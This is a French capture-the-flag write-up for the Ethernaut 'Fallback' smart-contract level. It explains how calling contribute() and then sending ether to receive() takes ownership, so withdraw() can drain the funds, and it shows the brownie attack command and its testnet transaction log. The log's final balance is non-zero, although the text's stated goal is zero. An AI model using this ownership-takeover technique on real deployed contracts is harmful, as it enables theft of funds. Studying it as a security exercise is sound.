# Fallback

## Objectifs
Les objectifs de ce niveau sont:
1- devenir le owner du contrat
2- réduire la balance du contrat à 0

La méthode [withdraw](contracts/fallback.sol#L37) utilise le `modifier` `onlyOwner`, nous devons donc passer `owner` avant de pouvoir réduire la balance du contrat à 0.

## Devenir owner

Le contrat donne la possibilité de devenir `owner` avec les méthodes suivantes:
- [`contribute`](contracts/fallback.sol#L29)
- [`receive`](contracts/fallback.sol#L43)

Lors de la création du contrat, la contribution du `owner` est de [`1000 ether`](contracts/fallback.sol#L14)
```solidity
constructor() public {
  owner = msg.sender;
  contributions[msg.sender] = 1000 * (1 ether);
}
```
Pour devenir `owner` via la méthode `contribute`, il est nécessaire de fournir une contribution plus importante que celle du `owner` mais cette méthode limite le `msg.value` à `0.001 ether`:
```solidity
function contribute() public payable {
  require(msg.value < 0.001 ether);
  contributions[msg.sender] += msg.value;
  if(contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
  }
}
```

Pour devenir `owner` via la méthode `receive`, il faut que la contribution soit supérieure à 0 et qu'il y ait de la valeur associé à cet appel:
```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

Afin de devenir `owner`, il faut appeller la méthode `contribute` avec un `msg.value` < `0.001 ether` ce qui permet d'avoir une contribution > 0.
Ensuite en envoyant des fonds à l'adresse du contrat, la méthode `receive` va être appellée et ainsi nous devenons `owner` du contrat.

## Récupération des fonds du contrat
Une fois que nous sommes owner, nous pouvons appeller la méthode `withdraw` qui nous permet de récupérer la totalité des fonds du contrat

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `goerli`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x6F9cf195B9B4c1259E8FCe5b4e30F7142f779DeA) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run attack main "0x3F1A2CFFDC74EB36e0B529f9b2462a6c1D94FDCA" --network goerli
```
```console
Brownie v1.19.0 - Python development framework for Ethereum

FallbackProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0xb546c7c85b8513fe46a7a819b4b269a0004f5d23191c627db8b232e2217634f0
  Gas price: 5.465819587 gwei   Gas limit: 52501   Nonce: 12
  Transaction confirmed   Block: 7828039   Gas used: 47729 (90.91%)

Transaction sent: 0xef990ff3dac0e346ddf6faa534447d3204826a3e0af1a6b208831b708704d575
  Gas price: 4.781299 gwei   Gas limit: 31132   Nonce: 13
  Transaction confirmed   Block: 7828070   Gas used: 28302 (90.91%)

Owner is hacker: True
Transaction sent: 0x4ceeca8811a63bfb30fa03c6cb5bbe0ef6424f9aa491067b2ce262eb2f90858b
  Gas price: 4.69966451 gwei   Gas limit: 35880   Nonce: 14
  Transaction confirmed   Block: 7828103   Gas used: 30364 (84.63%)

Final contract balance: 1500000000000000
```




